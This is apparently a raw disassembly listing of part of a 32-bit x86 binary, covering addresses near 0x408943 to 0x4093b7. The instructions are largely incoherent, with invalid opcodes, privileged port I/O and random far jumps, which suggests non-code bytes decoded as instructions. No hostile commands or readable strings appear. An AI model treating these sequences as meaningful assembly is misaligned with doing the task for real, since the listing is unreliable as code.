  408943:	pushf  
	...
  408960:	add    BYTE PTR [eax],al
  408962:	xchg   esp,eax
  408963:	mov    eax,0xb58c632c
  408968:	jp     0x408949
  40896a:	xor    DWORD PTR [edi-0x7c008298],0x32
  408971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408972:	push   DWORD PTR [ebx]
  408974:	xor    bh,BYTE PTR [ebp-0x7acddc01]
  40897a:	pop    ds
  40897b:	push   esp
  40897c:	xor    bl,BYTE PTR [ebp+0x11b3441f]
  408982:	scas   eax,DWORD PTR es:[edi]
  408983:	int3   
  408984:	adc    edx,0xffffffc3
  408987:	push   0xffffffdc
  408989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40898a:	ins    BYTE PTR es:[edi],dx
  40898b:	ins    BYTE PTR es:[edi],dx
  40898c:	fisttp WORD PTR [ebp+0x58]
  40898f:	push   eax
  408990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408991:	or     eax,0xf7899d79
  408996:	pop    eax
  408997:	ins    BYTE PTR es:[edi],dx
  408998:	cmp    eax,0x32d41dea
  40899d:	fstp   QWORD PTR ds:0x1c6532c4
  4089a3:	je     0x4089d8
  4089a5:	add    BYTE PTR [eax-0x11],dl
  4089a8:	fwait
  4089a9:	xor    edx,DWORD PTR [eax+0x5333abee]
  4089af:	mov    WORD PTR ds:[eax+0x60382b74],gs
  4089b6:	daa    
  4089b7:	push   ebx
  4089b8:	pop    edx
  4089b9:	dec    ecx
  4089ba:	sti    
  4089bb:	int    0xd5
  4089bd:	pop    ss
  4089be:	sbb    al,BYTE PTR [ebp+ebp*1-0x3b]
  4089c2:	sbb    eax,DWORD PTR ds:0x8fef
	...
  4089e4:	add    eax,0x50341b26
  4089e9:	hlt    
  4089ea:	sub    esi,DWORD PTR [eax+eiz*4]
  4089ed:	hlt    
  4089ee:	cmp    esi,DWORD PTR [eax+esi*4]
  4089f1:	hlt    
  4089f2:	dec    ebx
  4089f3:	xor    al,0x10
  4089f5:	lock pop ebx
  4089f7:	xor    al,0xd0
  4089f9:	mov    ch,0x66
  4089fb:	(bad)  
  4089fc:	jb     0x4089ea
  4089fe:	xchg   edx,eax
  4089ff:	out    0xb1,eax
  408a01:	jle    0x4089bb
  408a03:	inc    esi
  408a04:	je     0x4089ed
  408a06:	retf   0xd271
  408a09:	es iret 
  408a0b:	or     eax,0x6bc12e76
  408a10:	jmp    0xdbf4:0x503495e4
  408a17:	xor    al,0x90
  408a19:	repz jmp 0x408a50
  408a1c:	mov    al,ds:0xf034fbf3
  408a21:	repnz or esi,DWORD PTR ds:0x4e6af2d0
  408a28:	xchg   esi,eax
  408a29:	xchg   ecx,eax
  408a2a:	int3   
  408a2b:	inc    esi
  408a2c:	or     eax,0xeda9650d
  408a31:	lea    edx,[ebp+0x45c930a5]
  408a37:	test   BYTE PTR [edi-0x59],ah
  408a3a:	pop    ebp
  408a3b:	mov    ah,0xd
  408a3d:	and    eax,0xdd6326ce
  408a42:	or     eax,0xda4f88c
  408a47:	pushf  
	...
  408a64:	add    BYTE PTR [eax],al
  408a66:	loopne 0x408ae4
  408a68:	push   cs
  408a69:	lods   al,BYTE PTR ds:[esi]
  408a6a:	fadd   st,st(4)
  408a6c:	or     eax,0xe1ce0bc
  408a71:	int3   
  408a72:	cdq    
  408a73:	sbb    bl,BYTE PTR [ebx-0x2b3732fb]
  408a79:	addr16 dec ecx
  408a7b:	pop    esi
  408a7c:	adc    DWORD PTR [esi],eax
  408a7e:	add    ch,ch
  408a80:	cmc    
  408a81:	jno    0x408a9d
  408a83:	xchg   esp,edi
  408a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a86:	popf   
  408a87:	lock call 0x105f3c40
  408a8d:	lods   al,BYTE PTR ds:[esi]
  408a8e:	push   ds
  408a8f:	or     DWORD PTR [eax],edx
  408a91:	mov    ah,0x1e
  408a93:	mov    eax,ds:0x98febbf7
  408a98:	test   ebx,0xcbf7a0fe
  408a9e:	(bad)  
  408a9f:	xor    ebx,esp
  408aa1:	cmp    ah,dl
  408aa3:	dec    edi
  408aa4:	jne    0x408a2d
  408aa6:	mov    esp,esi
  408aa8:	pop    ebp
  408aa9:	sub    al,0xcc
  408aab:	mov    eax,ds:0x9932c018
  408ab0:	imul   ecx,DWORD PTR [ebp-0x26b075bd],0xffffffe5
  408ab7:	dec    esp
  408ab8:	or     BYTE PTR [ebx+edi*1+0x43b3f9a9],ch
  408abf:	mov    cl,0xf9
  408ac1:	mov    ebx,0xc3fa993b
  408ac6:	and    ebp,ebp
  408ac8:	cli    
  408ac9:	push   edi
	...
  408ae6:	add    BYTE PTR [eax],al
  408ae8:	sbb    ch,BYTE PTR [ebp+0x6418b13c]
  408aee:	push   0x89005078
  408af3:	push   ebp
  408af4:	enter  0xc7d1,0x44
  408af8:	cmp    dl,BYTE PTR [ecx]
  408afa:	into   
  408afb:	cmp    eax,0xcf07e1cc
  408b00:	add    esp,DWORD PTR [edi+0x1]
  408b03:	call   DWORD PTR [esi+0x9]
  408b06:	jmp    0x5140988e
  408b0b:	add    al,0xd
  408b0d:	add    BYTE PTR [ecx+0x590566fe],al
  408b13:	(bad)  
  408b14:	mov    esi,0x3fe6105
  408b19:	cmp    esi,DWORD PTR [ebx+eax*4]
  408b1c:	sub    al,0xb5
  408b1e:	inc    eax
  408b1f:	in     eax,dx
  408b20:	mov    ebp,0xa2c04f73
  408b25:	dec    eax
  408b26:	inc    ebp
  408b27:	fld    DWORD PTR [eax-0x4bbb6590]
  408b2d:	call   0xd894513f
  408b32:	fdivr  st,st(5)
  408b34:	ds add eax,0x546fde1
  408b3a:	in     eax,0xfe
  408b3c:	or     al,BYTE PTR [edi]
  408b3e:	cmc    
  408b3f:	(bad)  
  408b40:	sbb    al,BYTE PTR [edi]
  408b42:	in     eax,0xfe
  408b44:	or     cl,BYTE PTR [ebp+0x49]
  408b47:	add    DWORD PTR [eax],0x33349a
	...
  408b69:	add    BYTE PTR [ecx+0x67272026],cl
  408b6f:	and    ebx,DWORD PTR [eax-0x49]
  408b72:	les    ebp,FWORD PTR [ebx-0x33ab9a9b]
  408b78:	mov    ecx,0xaeccf9f2
  408b7d:	(bad)  
  408b7e:	mov    ds:0x4afe9105,al
  408b83:	add    al,0x5
  408b85:	add    BYTE PTR [ebp+0x4],dh
  408b88:	add    BYTE PTR ds:0x613c800d,al
  408b8e:	shl    BYTE PTR [ebp+0x3c],cl
  408b91:	mov    edi,0xcd55d7ef
  408b96:	xor    al,0x2e
  408b98:	xor    eax,esp
  408b9a:	js     0x408bd2
  408b9c:	and    BYTE PTR [ecx],bl
  408b9e:	sbb    DWORD PTR [edi],0xffffffe7
  408ba1:	mov    bh,0xba
  408ba3:	loope  0x408b58
  408ba5:	call   0x6b29571f
  408baa:	push   esi
  408bab:	cmp    DWORD PTR [ebx*1+0x153c3192],edi
  408bb2:	mov    dl,ch
  408bb4:	cmp    al,0x99
  408bb6:	or     eax,0xc993dd4
  408bbb:	add    BYTE PTR [eax],al
  408bbd:	jmp    0x1b1dd11a
  408bc2:	xchg   ecx,eax
  408bc3:	xor    al,BYTE PTR [edi]
  408bc5:	push   0x38
  408bc7:	xchg   ebx,eax
  408bc8:	add    edi,DWORD PTR [edx-0x119e6444]
	...
  408bea:	add    BYTE PTR [eax],al
  408bec:	aad    0xa7
  408bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bef:	lods   al,BYTE PTR ds:[esi]
  408bf0:	xchg   DWORD PTR [esi],eax
  408bf2:	aas    
  408bf3:	xor    ebx,DWORD PTR [eax+0x42]
  408bf6:	ss mov cl,0x37
  408bf9:	std    
  408bfa:	ss gs xor esi,eax
  408bfe:	cmp    eax,DWORD PTR [ebp+ecx*1+0xdb63c5e]
  408c05:	call   0x455a9746
  408c0a:	fwait
  408c0b:	addr16 jae 0x408bf5
  408c0e:	dec    cx
  408c10:	lods   al,BYTE PTR ds:[esi]
  408c11:	lahf   
  408c12:	xor    cl,BYTE PTR [edi-0x26653a40]
  408c18:	fcmovnu st,st(2)
  408c1a:	mov    al,0x36
  408c1c:	dec    edx
  408c1d:	xchg   edi,eax
  408c1e:	pop    ebx
  408c1f:	add    BYTE PTR [eax+ebp*1],dl
  408c22:	cmp    DWORD PTR [edx+0x44],ebx
  408c25:	cld    
  408c26:	(bad)  
  408c27:	(bad)  
  408c28:	call   0xce709e79
  408c2d:	dec    esp
  408c2e:	das    
  408c2f:	xor    BYTE PTR [edx+0x4c],bh
  408c32:	xor    BYTE PTR gs:[edi],dh
  408c35:	dec    esp
  408c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c37:	xrelease mov BYTE PTR [ecx-0x12958ef8],dl
  408c3e:	in     eax,0xbb
  408c40:	xchg   edx,eax
  408c41:	adc    esi,DWORD PTR [edx]
  408c43:	add    eax,0xc3b70837
  408c48:	bound  edi,QWORD PTR [ebx+0x678a5855]
  408c4e:	popa   
  408c4f:	adc    BYTE PTR [eax],al
	...
  408c6d:	add    BYTE PTR [esi],cl
  408c6f:	dec    ecx
  408c70:	gs xor eax,0x35c648e3
  408c76:	aaa    
  408c77:	dec    ecx
  408c78:	jecxz  0x408caf
  408c7a:	mov    WORD PTR [esi+0x71],es
  408c7d:	mov    WORD PTR ss:[esi-0x7e],es
  408c81:	add    ebp,DWORD PTR ss:[ecx+0x5d12f71a]
  408c88:	or     esi,DWORD PTR [esi-0x24b2f707]
  408c8e:	inc    ebx
  408c8f:	out    dx,eax
  408c90:	mov    bh,BYTE PTR [ebp+0x5ccc4c89]
  408c96:	fwait
  408c97:	in     eax,dx
  408c98:	bound  esi,QWORD PTR [ebp+ebx*2-0x63]
  408c9c:	inc    esp
  408c9d:	aaa    
  408c9e:	mov    esp,0xb7377946
  408ca3:	inc    edi
  408ca4:	lea    esi,[edi]
  408ca6:	arpl   WORD PTR [edi+0x53],ax
  408ca9:	cmp    al,bl
  408cab:	inc    ebx
  408cac:	xchg   ebp,eax
  408cad:	cmp    BYTE PTR [ecx-0x6effc006],dh
  408cb3:	jg     0x408cd7
  408cb5:	mov    esi,0xd15d990d
  408cba:	ror    BYTE PTR [ecx-0x1f],1
  408cbd:	mov    al,ds:0x630be51f
  408cc2:	and    DWORD PTR [esi],0xd9f77eb0
  408cc8:	jg     0x408c8c
  408cca:	adc    ecx,DWORD PTR [eax+0x0]
  408ccd:	dec    BYTE PTR [edx]
  408ccf:	sub    DWORD PTR [ebx+0x0],esi
	...
  408cee:	add    BYTE PTR [eax],al
  408cf0:	or     eax,0xd0002b1
  408cf5:	sub    al,0xf3
  408cf7:	push   cs
  408cf8:	std    
  408cf9:	inc    eax
  408cfa:	ret    
  408cfb:	pop    edi
  408cfc:	jl     0x408d6f
  408cfe:	nop
  408cff:	jp     0x408c96
  408d01:	adc    al,0xdc
  408d03:	fstp   DWORD PTR [ebp-0x3fc998d6]
  408d09:	aam    0x9e
  408d0b:	sti    
  408d0c:	mov    esp,0x65c778f7
  408d11:	fdiv   st(4),st
  408d13:	and    eax,0xacf54c3c
  408d18:	loop   0x408d8d
  408d1a:	retf   0x3162
  408d1d:	pop    edi
  408d1e:	adc    BYTE PTR [ecx-0x6],ch
  408d21:	pop    ds
  408d22:	sti    
  408d23:	test   eax,0x189e8732
  408d28:	mov    ah,0x35
  408d2a:	pop    edx
  408d2b:	push   ss
  408d2c:	mul    BYTE PTR [edi]
  408d2e:	jns    0x408d5d
  408d30:	adc    ebp,DWORD PTR [edx+0x64f559a0]
  408d36:	mov    ds:0xaeb7f4de,al
  408d3b:	push   ebx
  408d3c:	pop    ebp
  408d3d:	call   0xcb4d56fa
  408d42:	add    BYTE PTR [eax+0x1dfade9e],dh
  408d48:	int3   
  408d49:	mov    DWORD PTR [ebp+0x79ffa8b5],ebp
  408d4f:	(bad)  
  408d50:	popa   
  408d51:	shr    ch,1
  408d53:	sub    al,0x0
	...
  408d71:	add    BYTE PTR [eax+0x284b7917],dh
  408d77:	jmp    0x408dbb
  408d79:	(bad)  
  408d7a:	arpl   WORD PTR [esp+eax*8-0x18],dx
  408d7e:	push   ecx
  408d7f:	mov    eax,ds:0xfd80f91f
  408d84:	dec    DWORD PTR cs:[eax-0x1]
  408d88:	add    al,0xff
  408d8a:	or     bh,bh
  408d8c:	jge    0x408d8d
  408d8e:	add    al,0x20
  408d90:	iret   
  408d91:	and    DWORD PTR ds:0xc5540cb4,edi
  408d97:	pop    eax
  408d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d99:	icebp  
  408d9a:	xor    eax,0xe33d971b
  408d9f:	dec    ecx
  408da0:	push   0xa84fe334
  408da5:	dec    esi
  408da6:	ds jmp 0xeaf5:0xb2240ebd
  408dae:	gs dec ebp
  408db0:	inc    edi
  408db1:	fimul  DWORD PTR [eax+0x50]
  408db4:	jmp    0x2872:0xa72ffd3b
  408dbb:	cmc    
  408dbc:	add    esi,DWORD PTR [ebp-0x23]
  408dbf:	(bad)  
  408dc0:	mov    eax,0xf5e3dd3e
  408dc5:	dec    edx
  408dc6:	loop   0x408d90
  408dc8:	iret   
  408dc9:	in     eax,0x3b
  408dcb:	push   ss
  408dcc:	aam    0x92
  408dce:	adc    bl,BYTE PTR [eax]
  408dd0:	shr    cl,1
  408dd2:	add    eax,0x9648af
	...
  408df3:	add    BYTE PTR [ebx+0x5c105ef8],bh
  408df9:	mov    dh,0x1b
  408dfb:	push   0x1e
  408dfd:	or     eax,DWORD PTR [ebx+0x19]
  408e00:	es mov dl,0xff
  408e03:	sbb    eax,0xf22cd572
  408e08:	sti    
  408e09:	out    0x8e,al
  408e0b:	bswap  ebx
  408e0d:	test   ebx,esp
  408e0f:	xchg   edx,eax
  408e10:	mov    esi,0xa9c9026a
  408e15:	sub    DWORD PTR [esi-0x50],esp
  408e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e19:	scas   al,BYTE PTR es:[edi]
  408e1a:	jmp    DWORD PTR [edi+0x62d5e01b]
  408e20:	gs cwde 
  408e22:	jmp    0x408e82
  408e24:	mov    ds:0x46482253,eax
  408e29:	xor    al,0xe4
  408e2b:	jl     0x408eac
  408e2d:	mov    bh,0xd5
  408e2f:	(bad)  
  408e30:	enter  0x2ca1,0xbd
  408e34:	xchg   esi,eax
  408e35:	iret   
  408e36:	shl    BYTE PTR [eax],1
  408e38:	jl     0x408e4f
  408e3a:	cmp    al,0x20
  408e3c:	cmp    eax,0xf2f2752
  408e41:	adc    eax,0x22bb9c51
  408e46:	scas   eax,DWORD PTR es:[edi]
  408e47:	or     bh,BYTE PTR [ecx+0x7b]
  408e4a:	push   0x40
  408e4c:	inc    ebp
  408e4d:	add    al,0x5b
  408e4f:	jle    0x408dfe
  408e51:	jns    0x408de7
  408e53:	cmp    ecx,DWORD PTR [eax-0x60]
  408e56:	test   al,0xcc
	...
  408e74:	add    BYTE PTR [eax],al
  408e76:	sar    DWORD PTR [ebx],cl
  408e78:	xchg   edi,eax
  408e79:	pop    ebx
  408e7a:	push   esi
  408e7b:	stc    
  408e7c:	sbb    al,0x17
  408e7e:	int3   
  408e7f:	xchg   DWORD PTR [ebp-0x34c0bdcf],ebx
  408e85:	cmp    al,0x9b
  408e87:	aaa    
  408e88:	loopne 0x408e2d
  408e8a:	xchg   esi,eax
  408e8b:	cmp    BYTE PTR [esi+0x3d],dh
  408e8e:	mov    esi,0xed1d47d3
  408e93:	aaa    
  408e94:	cmp    BYTE PTR [ecx+0x51],dl
  408e97:	inc    edx
  408e98:	in     eax,0x0
  408e9a:	mov    eax,0x2129cca6
  408e9f:	ret    
  408ea0:	test   BYTE PTR [ebp-0x4],dl
  408ea3:	je     0x408ec4
  408ea5:	lahf   
  408ea6:	nop
  408ea7:	pop    ss
  408ea8:	add    al,ch
  408eaa:	test   eax,0x55976d21
  408eaf:	pusha  
  408eb0:	and    esi,DWORD PTR [ecx+0x5e6ad6ad]
  408eb6:	pop    edi
  408eb7:	test   DWORD PTR [ecx+0x4f8d64e8],ecx
  408ebd:	(bad)  
  408ec1:	sbb    eax,0x6cf98bb7
  408ec6:	scas   eax,DWORD PTR es:[edi]
  408ec7:	inc    edx
  408ec8:	add    al,0xe1
  408eca:	int3   
  408ecb:	neg    BYTE PTR [eax-0x6b0407d6]
  408ed1:	mov    edi,0xe0d50953
  408ed6:	in     al,dx
  408ed7:	loope  0x408f39
  408ed9:	fiadd  DWORD PTR [eax]
	...
  408ef7:	add    bl,dh
  408ef9:	imul   BYTE PTR [ebx+0x5785fdeb]
  408eff:	mov    ebx,0xa14c8dc8
  408f04:	inc    edi
  408f05:	data16 fxch st(2)
  408f08:	adc    ebx,0xffffff9b
  408f0b:	mov    ebp,0xa376b82d
  408f10:	or     BYTE PTR [ebp+0x42],bl
  408f13:	mov    dl,0x97
  408f15:	mov    ds:0x6903dee2,al
  408f1a:	adc    al,0xf3
  408f1c:	ret    
  408f1d:	data16 sti 
  408f1f:	push   ss
  408f20:	add    BYTE PTR [edi+0x10],bh
  408f23:	jge    0x408f7a
  408f25:	adc    BYTE PTR [esi],ch
  408f27:	xor    esi,ebx
  408f29:	sbb    DWORD PTR [esi],edi
  408f2b:	std    
  408f2c:	xchg   esi,eax
  408f2d:	leave  
  408f2e:	push   ebp
  408f2f:	adc    ecx,DWORD PTR ds:0xa6010416
  408f35:	push   es
  408f36:	ins    DWORD PTR es:[edi],dx
  408f37:	dec    eax
  408f38:	xchg   esi,eax
  408f39:	pop    ebx
  408f3a:	xchg   esp,eax
  408f3b:	and    ecx,DWORD PTR [ecx-0x40]
  408f3e:	push   esp
  408f3f:	push   ebp
  408f40:	push   ebx
  408f41:	pop    ecx
  408f42:	mov    ch,0xab
  408f44:	sbb    al,0xa2
  408f46:	test   BYTE PTR [edi+0x1c],dl
  408f49:	sub    BYTE PTR [ecx],al
  408f4b:	add    BYTE PTR ds:0xd000329,cl
  408f51:	daa    
  408f52:	add    DWORD PTR [eax],eax
  408f54:	or     eax,0xd000327
  408f59:	sub    BYTE PTR [edx],al
	...
  408f77:	add    BYTE PTR [eax],al
  408f79:	add    BYTE PTR ds:0xd000325,cl
  408f7f:	daa    
  408f80:	add    al,BYTE PTR [eax]
  408f82:	or     eax,0xd000323
  408f87:	sub    DWORD PTR [ebx],eax
  408f89:	add    BYTE PTR ds:0xd000329,cl
  408f8f:	sub    DWORD PTR [ebx],eax
  408f91:	add    BYTE PTR ds:0xd000329,cl
  408f97:	sub    DWORD PTR [ebx],eax
  408f99:	add    BYTE PTR ds:0xd000329,cl
  408f9f:	sub    DWORD PTR [ebx],eax
  408fa1:	add    BYTE PTR ds:0xd000329,cl
  408fa7:	sub    edx,esp
  408fa9:	jmp    FWORD PTR [edi]
  408fab:	inc    ebp
  408fac:	out    0x25,al
  408fae:	sub    ch,BYTE PTR [ecx]
  408fb0:	add    ebp,DWORD PTR [edx]
  408fb2:	ss sub esi,ebp
  408fb5:	sub    eax,0x31f2790d
  408fba:	push   ds
  408fbb:	jne    0x408fb3
  408fbd:	xor    eax,0xfffa711a
  408fc2:	dec    edx
  408fc3:	sub    DWORD PTR [ebx],eax
  408fc5:	add    BYTE PTR ds:0xaca4e900,cl
  408fcb:	sahf   
  408fcc:	inc    esp
  408fcd:	mov    eax,ds:0xad40a2a8
  408fd2:	mov    ah,0xa6
  408fd4:	cmp    al,0xa9
  408fd6:	mov    al,0xaa
  408fd8:	cmp    BYTE PTR [ebp-0x4ecb5164],dh
	...
  408ffa:	add    BYTE PTR [eax],al
  408ffc:	cwde   
  408ffd:	mov    dl,0x30
  408fff:	mov    ebp,0x3e90084
  409004:	arpl   bx,bx
  409006:	or     BYTE PTR [ebp-0x5efb6094],ah
  40900c:	push   0x74ad00a3
  409011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409012:	cld    
  409013:	test   al,0x70
  409015:	stos   DWORD PTR es:[edi],eax
  409016:	clc    
  409017:	mov    ah,0x5c
  409019:	scas   eax,DWORD PTR es:[edi]
  40901a:	hlt    
  40901b:	mov    al,0x58
  40901d:	mov    bl,0xf0
  40901f:	mov    esp,0x3ed0044
  409024:	inc    ebx
  409025:	add    cl,ch
  409027:	add    ecx,DWORD PTR ds:0xd03e900
  40902d:	add    cl,ch
  40902f:	add    ecx,DWORD PTR ds:0xd03e900
  409035:	add    cl,ch
  409037:	add    ecx,DWORD PTR ds:0xd03e900
  40903d:	add    cl,ch
  40903f:	add    ecx,DWORD PTR ds:0xd03e900
  409045:	add    cl,ch
  409047:	add    ecx,DWORD PTR ds:0xd03e900
  40904d:	add    cl,ch
  40904f:	add    ecx,DWORD PTR ds:0xd03e900
  409055:	add    cl,ch
  409057:	add    ecx,DWORD PTR ds:0xd03e900
  40905d:	add    BYTE PTR [eax],al
  40905f:	jmp    0x409064
	...
  40907c:	add    BYTE PTR [eax],al
  40907e:	push   cs
  40907f:	add    BYTE PTR [eax],al
  409081:	jmp    0xe9409094
  409086:	push   cs
  409087:	add    BYTE PTR [eax],al
  409089:	jmp    0xe940909c
  40908e:	push   cs
  40908f:	add    BYTE PTR [eax],al
  409091:	jmp    0xe94090a4
  409096:	push   cs
  409097:	add    BYTE PTR [eax],al
  409099:	jmp    0xe94090ac
  40909e:	push   cs
  40909f:	add    BYTE PTR [eax],al
  4090a1:	jmp    0xe94090b4
  4090a6:	push   cs
  4090a7:	add    BYTE PTR [eax],al
  4090a9:	jmp    0xe94090bc
  4090ae:	push   cs
  4090af:	add    BYTE PTR [eax],al
  4090b1:	jmp    0xe94090c4
  4090b6:	push   cs
  4090b7:	add    BYTE PTR [eax],al
  4090b9:	jmp    0xe94090cc
  4090be:	push   cs
  4090bf:	add    BYTE PTR [eax],al
  4090c1:	jmp    0x664090d4
  4090c6:	idiv   DWORD PTR [eax]
  4090c8:	call   FWORD PTR [esi-0x9]
  4090cb:	cmp    bh,bh
  4090cd:	push   esi
  4090ce:	out    0x38,eax
  4090d0:	dec    DWORD PTR [esi-0x19]
  4090d3:	cmp    bh,bh
  4090d5:	inc    esi
  4090d6:	xlat   BYTE PTR ds:[ebx]
  4090d7:	cmp    bh,bh
  4090d9:	xlat   BYTE PTR ds:[ebx]
  4090db:	cmp    bh,bh
  4090dd:	ss inc edi
  4090df:	cmp    edi,edi
  4090e1:	add    BYTE PTR cs:[eax],al
	...
  409100:	inc    edi
  409101:	cmp    edi,edi
  409103:	es aaa 
  409105:	cmp    edi,edi
  409107:	push   ds
  409108:	aaa    
  409109:	cmp    edi,edi
  40910b:	push   ss
  40910c:	daa    
  40910d:	cmp    edi,edi
  40910f:	push   cs
  409110:	daa    
  409111:	cmp    edi,edi
  409113:	add    BYTE PTR [esp+eax*1+0x2],ah
  409117:	add    ebp,DWORD PTR [eax+0x0]
  40911a:	push   es
  40911b:	pop    es
  40911c:	sub    al,0xc
  40911e:	(bad)  
  40911f:	push   DWORD PTR [ebx]
  409121:	idiv   esi
  409123:	push   DWORD PTR [ebx]
  409125:	or     cl,BYTE PTR [ebx]
  409127:	or     al,0x21
  409129:	pop    es
  40912a:	ud0    eax,DWORD PTR [ebx-0x9]
  40912e:	(bad)  
  40912f:	call   DWORD PTR [ebx-0x9]
  409132:	(bad)  
  409133:	call   DWORD PTR [ebx-0x9]
  409136:	(bad)  
  409137:	call   DWORD PTR [ebx-0x9]
  40913a:	(bad)  
  40913b:	inc    ebx
  40913d:	idiv   dh
  40913f:	push   DWORD PTR [ebx-0x4c00010a]
  409145:	or     DWORD PTR [ebx],ecx
  409147:	or     al,0xe1
  409149:	push   es
  40914a:	ud0    eax,DWORD PTR [ebx-0x6c00010a]
  409151:	idiv   dh
  409153:	call   DWORD PTR [ebx+0x53fffef6]
  409159:	idiv   esi
  40915b:	inc    DWORD PTR [ebx-0x9]
  40915e:	(bad)  
  40915f:	push   DWORD PTR [ebx]
  409161:	idiv   esi
  409163:	inc    DWORD PTR [eax]
	...
  409181:	add    BYTE PTR [esp+edi*8-0x35b0001],ah
  409188:	(bad)  
  409189:	push   DWORD PTR [esp+edi*8-0x34b0001]
  409190:	(bad)  
  409191:	jmp    DWORD PTR [esp+edi*8-0x35b0001]
  409198:	(bad)  
  409199:	push   DWORD PTR [esp+edi*8-0x1]
  40919d:	push   DWORD PTR [esp+edi*8-0x1]
  4091a1:	jmp    DWORD PTR [esp+edi*8-0x1]
  4091a5:	jmp    DWORD PTR [esp+edi*8-0x1]
  4091a9:	dec    DWORD PTR ds:0xd000327
  4091af:	daa    
  4091b0:	add    eax,DWORD PTR [eax]
  4091b2:	or     eax,0xd000327
  4091b7:	daa    
  4091b8:	add    eax,DWORD PTR [eax]
  4091ba:	or     eax,0xd000327
  4091bf:	daa    
  4091c0:	add    eax,DWORD PTR [eax]
  4091c2:	or     eax,0xd000327
  4091c7:	daa    
  4091c8:	add    eax,DWORD PTR [eax]
  4091ca:	or     eax,0xd000327
  4091cf:	daa    
  4091d0:	add    eax,DWORD PTR [eax]
  4091d2:	or     eax,0xd000327
  4091d7:	daa    
  4091d8:	add    eax,DWORD PTR [eax]
  4091da:	or     eax,0xd000329
  4091df:	sub    DWORD PTR [ebx],eax
  4091e1:	add    BYTE PTR ds:0x329,cl
	...
  409203:	add    BYTE PTR ds:0xd000329,cl
  409209:	sub    DWORD PTR [ebx],eax
  40920b:	add    BYTE PTR ds:0xd000329,cl
  409211:	sub    DWORD PTR [ebx],eax
  409213:	add    BYTE PTR ds:0xd000329,cl
  409219:	sub    DWORD PTR [ebx],eax
  40921b:	add    BYTE PTR ds:0xd000329,cl
  409221:	sub    DWORD PTR [ebx],eax
  409223:	add    BYTE PTR ds:0xd000329,cl
  409229:	sub    DWORD PTR [ebx],eax
  40922b:	add    BYTE PTR ds:0xd000329,cl
  409231:	sub    DWORD PTR [ebx],eax
  409233:	add    BYTE PTR ds:0xd000329,cl
  409239:	sub    DWORD PTR [ebx],eax
  40923b:	add    BYTE PTR ds:0xd000329,cl
  409241:	add    cl,ch
  409243:	add    cl,BYTE PTR [eax+eax*1]
  409246:	call   0xe8419e4d
  40924b:	add    cl,BYTE PTR [ecx+eax*1]
  40924e:	call   0xe8419e55
  409253:	add    cl,BYTE PTR [ecx+eax*1]
  409256:	call   0xe8419e5d
  40925b:	add    cl,BYTE PTR [ecx+eax*1]
  40925e:	call   0xe8409e65
  409263:	add    al,0xc
  409265:	add    eax,ebp
  409267:	add    al,0x0
	...
  409285:	add    BYTE PTR [ecx+eax*1],cl
  409288:	call   0xe8419e91
  40928d:	add    al,0xc
  40928f:	add    eax,ebp
  409291:	add    al,0xc
  409293:	add    eax,ebp
  409295:	add    al,0xc
  409297:	add    eax,ebp
  409299:	add    al,0xc
  40929b:	add    eax,ebp
  40929d:	add    al,0xc
  40929f:	add    eax,ebp
  4092a1:	add    al,0xc
  4092a3:	add    eax,ebp
  4092a5:	add    al,0xc
  4092a7:	add    eax,ebp
  4092a9:	add    al,0xc
  4092ab:	add    eax,ebp
  4092ad:	add    al,0xc
  4092af:	add    eax,ebp
  4092b1:	add    al,0xc
  4092b3:	add    eax,ebp
  4092b5:	add    al,0xc
  4092b7:	add    eax,ebp
  4092b9:	add    al,0xc
  4092bb:	add    eax,ebp
  4092bd:	add    al,0xc
  4092bf:	add    cl,ch
  4092c1:	add    ecx,DWORD PTR ds:0xd03e900
  4092c7:	add    cl,ch
  4092c9:	add    ecx,DWORD PTR ds:0xd03e900
  4092cf:	add    cl,ch
  4092d1:	add    ecx,DWORD PTR ds:0xd03e900
  4092d7:	add    BYTE PTR [eax],al
  4092d9:	jmp    0xe94092ec
  4092de:	push   cs
  4092df:	add    BYTE PTR [eax],al
  4092e1:	jmp    0xe94092f4
  4092e6:	push   cs
  4092e7:	add    BYTE PTR [eax],al
  4092e9:	jmp    0x4092ee
	...
  409306:	add    BYTE PTR [eax],al
  409308:	push   cs
  409309:	add    BYTE PTR [eax],al
  40930b:	jmp    0xe940931e
  409310:	push   cs
  409311:	add    BYTE PTR [eax],al
  409313:	jmp    0xe9409326
  409318:	push   cs
  409319:	add    BYTE PTR [eax],al
  40931b:	jmp    0xe940932e
  409320:	push   cs
  409321:	add    BYTE PTR [eax],al
  409323:	jmp    0xe9409336
  409328:	push   cs
  409329:	add    BYTE PTR [eax],al
  40932b:	jmp    0xe940933e
  409330:	push   cs
  409331:	add    BYTE PTR [eax],al
  409333:	jmp    0xe9409346
  409338:	push   cs
  409339:	add    BYTE PTR [eax],al
  40933b:	jmp    0xe940934e
  409340:	push   cs
  409341:	add    BYTE PTR [eax],al
  409343:	jmp    0xe9409356
  409348:	push   cs
  409349:	add    BYTE PTR [eax],al
  40934b:	jmp    0xe940935e
  409350:	push   cs
  409351:	add    BYTE PTR [eax],al
  409353:	jmp    0xe9409366
  409358:	push   cs
  409359:	add    BYTE PTR [eax],al
  40935b:	jmp    0xe940936e
  409360:	or     DWORD PTR [edx],eax
  409362:	add    esp,ebp
  409364:	or     eax,0x11e106fe
  409369:	or     cl,BYTE PTR [ebx]
  40936b:	fld    QWORD PTR [eax]
	...
  409389:	add    BYTE PTR ds:0xb4000f06,al
  40938f:	or     al,0x12
  409391:	adc    esp,DWORD PTR [eax+0x10]
  409394:	push   ss
  409395:	pop    ss
  409396:	pop    esp
  409397:	adc    al,0x1a
  409399:	sbb    ecx,DWORD PTR [eax+0x18]
  40939c:	push   ds
  40939d:	pop    ds
  40939e:	inc    esp
  40939f:	sbb    al,0x21
  4093a1:	and    edx,DWORD PTR [eax+0x20]
  4093a4:	and    eax,0x29244c27
  4093a9:	sub    ebx,DWORD PTR [eax-0x6bd0d2d8]
  4093af:	sub    al,0x31
  4093b1:	xor    eax,DWORD PTR [eax+0x7c373530]
  4093b7:	xor    al,0x39
